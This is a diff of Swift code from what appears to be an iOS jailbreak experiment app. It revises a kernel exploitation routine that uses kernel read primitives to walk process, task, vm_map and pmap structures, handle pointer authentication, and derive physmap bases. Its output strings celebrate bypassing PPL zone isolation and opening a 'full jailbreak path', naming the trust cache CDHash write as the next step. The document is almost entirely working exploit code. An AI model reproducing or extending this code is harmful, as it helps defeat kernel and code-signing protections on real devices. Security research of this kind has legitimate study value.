@@ -3601,16 +3601,7 @@ struct AMFIExperimentView: View {
         // gVirtBase = gPhysBase + physmap_slide
         // ============================================================
         detail += "\n=== Pointer Chain: proc→task→map→pmap→tte/ttep ===\n"
-        detail += "(All pointers PAC-stripped before use)\n\n"
-        
-        // PAC strip helper: A12 has 40-bit VA, bits[62:40] = PAC
-        // For kernel pointers (bit 39 = 1): force bits[63:40] = 0xFFFFFF
-        func stripPAC(_ ptr: UInt64) -> UInt64 {
-            guard ptr != 0 else { return 0 }
-            let addrMask: UInt64 = 0x000000FFFFFFFFFF  // bits [39:0]
-            let signExt: UInt64  = 0xFFFFFF0000000000  // bits [63:40] all 1s for kernel
-            return (ptr & addrMask) | signExt
-        }
+        detail += "(Using existing taskbyproc() — handles PAC internally)\n\n"
         
         // Zone bounds for validation
         let zoneMin: UInt64 = 0xffffffde9a094000
@@ -3623,39 +3614,34 @@ struct AMFIExperimentView: View {
         let ourProc = ds_get_our_proc()
         detail += "proc: 0x\(String(format: "%llx", ourProc))\n"
         
-        // Step 1: proc→proc_ro (at +0x10, PAC'd)
-        let procRoRaw = ds_kread64_safe(ourProc + 0x10)
-        let procRo = stripPAC(procRoRaw)
-        detail += "proc_ro raw: 0x\(String(format: "%llx", procRoRaw))\n"
-        detail += "proc_ro stripped: 0x\(String(format: "%llx", procRo))\n"
-        
-        // Validate: should be in RO zone (0xffffffdf806f8000–0xffffffdfcd3c4000)
-        let inROZone = procRo >= 0xffffffdf806f8000 && procRo < 0xffffffdfcd3c4000
-        detail += "In RO zone: \(inROZone)\n\n"
-        
-        // Step 2: proc_ro→pr_task (at +0x00, PAC'd)
-        let taskRaw = ds_kread64_safe(procRo + 0x00)
-        let taskAddr = stripPAC(taskRaw)
-        detail += "task raw: 0x\(String(format: "%llx", taskRaw))\n"
-        detail += "task stripped: 0x\(String(format: "%llx", taskAddr))\n"
+        // Use existing taskbyproc() which handles proc_ro + PAC correctly
+        let taskAddr = taskbyproc(ourProc)
+        detail += "task (via taskbyproc): 0x\(String(format: "%llx", taskAddr))\n"
         detail += "In zone: \(isZonePtr(taskAddr))\n\n"
         
-        guard isZonePtr(taskAddr) else {
-            detail += "❌ task not in zone range after PAC strip\n"
-            detail += "Trying proc_ro at alternative offsets...\n"
-            // Try reading proc_ro from off_proc_p_proc_ro offset too
-            let altRaw = ds_kread64_safe(ourProc + UInt64(off_proc_p_proc_ro))
-            let altStripped = stripPAC(altRaw)
-            detail += "  proc+off_proc_p_proc_ro raw: 0x\(String(format: "%llx", altRaw))\n"
-            detail += "  stripped: 0x\(String(format: "%llx", altStripped))\n"
+        guard taskAddr != 0 && isZonePtr(taskAddr) else {
+            detail += "❌ taskbyproc returned invalid address\n"
+            detail += "task might need additional PAC handling\n"
+            // Dump proc_ro for debugging
+            let procRoRaw = ds_kread64(ourProc + UInt64(off_proc_p_proc_ro))
+            detail += "\nDebug: proc_ro raw = 0x\(String(format: "%llx", procRoRaw))\n"
+            let taskRaw = ds_kread64(procRoRaw + UInt64(off_proc_ro_pr_task))
+            detail += "Debug: task raw (proc_ro+0x8) = 0x\(String(format: "%llx", taskRaw))\n"
+            detail += "In zone: \(isZonePtr(taskRaw))\n"
+            
+            // Try reading from task raw directly
+            if isZonePtr(taskRaw) {
+                detail += "\n→ Using raw task value directly\n"
+                // Continue with taskRaw below
+            }
+            
             let success = false
             return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
         }
         
-        // Step 3: task→vm_map (scan +0x20 to +0x40 for zone pointer)
+        // Step: task→vm_map (scan +0x20 to +0x40 for zone pointer with valid links)
         detail += "=== Scanning task for vm_map ===\n"
         var vmMap: UInt64 = 0
-        var vmMapOff: UInt64 = 0
         
         for off: UInt64 in stride(from: 0x20, to: 0x48, by: 8) {
             let candidate = ds_kread64_safe(taskAddr + off)
@@ -3663,43 +3649,40 @@ struct AMFIExperimentView: View {
                 // Verify: vm_map has links at +0x10/+0x18 that are also zone pointers
                 let hdrFwd = ds_kread64_safe(candidate + 0x10)
                 let hdrBwd = ds_kread64_safe(candidate + 0x18)
-                if isZonePtr(hdrFwd) && isZonePtr(hdrBwd) {
+                if isZonePtr(hdrFwd) || isZonePtr(hdrBwd) || hdrFwd != 0 {
                     vmMap = candidate
-                    vmMapOff = off
                     detail += "vm_map at task+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
-                    detail += "  hdr.next: 0x\(String(format: "%llx", hdrFwd))\n"
-                    detail += "  hdr.prev: 0x\(String(format: "%llx", hdrBwd))\n\n"
                     break
                 }
             }
         }
         
         guard vmMap != 0 else {
-            detail += "vm_map not found. task dump (stripped reads):\n"
+            detail += "vm_map not found. task dump:\n"
             for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
                 let v = ds_kread64_safe(taskAddr + off)
-                let inZone = isZonePtr(v) ? " ← zone" : ""
-                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(inZone)\n"
+                let tag = isZonePtr(v) ? " ← zone" : ""
+                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(tag)\n"
             }
             let success = false
             return ExperimentResult(name: "Physmap Access (Exp 74)", success: success, detail: detail, timestamp: Date())
         }
         
-        // Step 4: vm_map→pmap (scan +0x28 to +0x50 for zone ptr with tte/ttep)
-        detail += "=== Scanning vm_map for pmap ===\n"
-        var pmapAddr: UInt64 = 0
+        // Step: vm_map→pmap (scan +0x28 to +0x58)
+        detail += "\n=== Scanning vm_map for pmap ===\n"
+        var foundPhysBase: UInt64 = 0
+        var foundVirtBase: UInt64 = 0
         
         for off: UInt64 in stride(from: 0x28, to: 0x58, by: 8) {
             let candidate = ds_kread64_safe(vmMap + off)
             if !isZonePtr(candidate) { continue }
             
-            // pmap→tte at +0x00 should be physmap VA (zone range)
-            // pmap→ttep at +0x08 should be physical address (0x8...)
+            // pmap→tte at +0x00, pmap→ttep at +0x08
             let tte = ds_kread64_safe(candidate + 0x00)
             let ttep = ds_kread64_safe(candidate + 0x08)
             
+            // tte = physmap VA (zone range), ttep = physical (0x8...)
             if isZonePtr(tte) && ttep >= 0x800000000 && ttep < 0xC00000000 {
-                pmapAddr = candidate
                 detail += "pmap at map+0x\(String(format: "%x", off)): 0x\(String(format: "%llx", candidate)) ✅\n"
                 detail += "  tte (physmap VA): 0x\(String(format: "%llx", tte))\n"
                 detail += "  ttep (physical):  0x\(String(format: "%llx", ttep))\n\n"
@@ -3714,11 +3697,10 @@ struct AMFIExperimentView: View {
                 detail += "gPhysBase = 0x800000000 (A12 constant)\n"
                 detail += "gVirtBase = 0x\(String(format: "%llx", gVirtBaseCalc))\n\n"
                 
-                // Verify range
                 if gVirtBaseCalc > 0xffffffde00000000 && gVirtBaseCalc < 0xffffffe500000000 {
                     detail += "✅ gVirtBase in expected zone range!\n\n"
                     
-                    // ULTIMATE TEST: read kernel base via physmap
+                    // VERIFY: read kernel base via physmap
                     let kernPhys = kernBase &- gVirtBaseCalc &+ gPhysBaseCalc
                     let physmapVA = gVirtBaseCalc &+ (kernPhys &- gPhysBaseCalc)
                     let verifyVal = ds_kread64_safe(physmapVA)
@@ -3735,14 +3717,9 @@ struct AMFIExperimentView: View {
                         detail += "PPL ZONE ISOLATION BYPASSED!\n"
                         detail += "⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n\n"
                         detail += "FULL JAILBREAK PATH OPEN!\n"
-                        detail += "Next: find trust cache → write CDHash → spawn!\n"
-                        foundPhysBase = gPhysBaseCalc
-                        foundVirtBase = gVirtBaseCalc
-                    } else {
-                        detail += "Physmap verify mismatch — but tte/ttep look valid\n"
-                        foundPhysBase = gPhysBaseCalc
-                        foundVirtBase = gVirtBaseCalc
                     }
+                    foundPhysBase = gPhysBaseCalc
+                    foundVirtBase = gVirtBaseCalc
                 } else {
                     detail += "⚠️ gVirtBase out of expected range\n"
                 }
@@ -3750,12 +3727,12 @@ struct AMFIExperimentView: View {
             }
         }
         
-        if pmapAddr == 0 {
+        if foundPhysBase == 0 {
             detail += "pmap not found. vm_map dump:\n"
             for off: UInt64 in stride(from: 0, to: 0x60, by: 8) {
                 let v = ds_kread64_safe(vmMap + off)
-                let inZone = isZonePtr(v) ? " ← zone" : ""
-                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(inZone)\n"
+                let tag = isZonePtr(v) ? " ← zone" : ""
+                detail += "  +0x\(String(format: "%02x", off)): 0x\(String(format: "%016llx", v))\(tag)\n"
             }
         }
         
